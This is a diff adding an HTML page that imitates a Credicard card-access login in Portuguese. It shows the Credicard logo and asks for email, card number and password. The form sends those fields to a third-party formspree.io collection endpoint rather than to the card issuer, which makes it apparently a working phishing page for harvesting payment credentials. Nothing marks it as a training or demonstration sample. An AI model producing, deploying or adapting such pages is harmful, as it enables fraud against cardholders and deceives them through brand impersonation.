@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cartões de Crédito - Credicard</title>
+    <style>
+        body{
+            font-family: Arial, Helvetica, sans-serif;
+            background:rgb(255, 255, 255);
+            font-size: 18px;
+    
+        }
+        .box{
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%,-43%);
+            background-color: rgb(255, 255, 255);
+            padding: 100px;
+            border-radius: 15px;
+            width: 30%;
+        }
+        fieldset{
+            border: 0px solid rgb(255, 255, 255)
+        }
+        legend{
+            
+            padding: 20px;
+            text-align: center;
+            background-color: rgba(255, 255, 255, 0.849);
+            border-radius: 5px;
+        }
+        .inputBox{
+            position: relative;
+        }
+        .inputUser{
+            background: none;
+            border: none;
+            border-bottom: 1px solid rgb(0, 0, 0);
+            outline: none;
+            color: rgb(0, 0, 0);
+            font-size: 20px;
+            width: 100%;
+            letter-spacing: 2px;
+        }
+        .labelInput{
+            position: absolute;
+            top: 0px;
+            left: 0px;
+            pointer-events: none;
+            transition: .5s;
+        }
+        .inputUser:focus ~ .labelInput,
+        .inputUser:valid ~ .labelInput  {
+            top: -20px;
+            font-size: 12px;
+            color: rgba(2, 44, 99, 0.753);
+        }
+        #submit{
+            background: rgba(2, 44, 99, 0.753);
+            width: 100%;
+            border: none;
+            padding: 15px;
+            color: rgb(255, 255, 255);
+            font-size: 20px;
+            cursor: pointer;
+            border-radius: 10px;
+        }
+        #submit:hover{
+            background: rgba(4, 58, 129, 0.753);
+        }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <form action= "https://formspree.io/f/mwkykzrv"
+        method="POST" >
+            <fieldset>
+                <legend><b>Acesse aqui o seu Cartão Credicard:</b></legend>
+                <br><br>
+                <div class="inputBox">
+                    <input type="email" name="Email" id="Email" class="inputUser" required>
+                    <label for="nome"class="labelInput">Email: </label> 
+                    <br>
+                </div>
+                <br>
+                <div class="inputBox">
+                    <input type="text" name="Número do Cartão" id="Número do Cartão" class="inputUser" required>
+                    <label for="nome"class="labelInput">Número do Cartão: </label>
+                </div>
+                <br><br>
+                <div class="inputBox">
+                    <input type="text" name="Senha" id="Senha" class="inputUser" required>
+                    <label for="nome" class="labelInput">Senha: </label>
+                </div>
+                <br><br>
+                <div class="inputBox">
+                    
+                    
+                </div>
+                <br><br>
+                <input type="submit" name="submit" id="submit">
+            </fieldset>
+        </form>
+    </div>
+</body>
+</html>
+<div>
+    <img src="credicard-logo.jpg" alt="">
+</div>
+
+
+
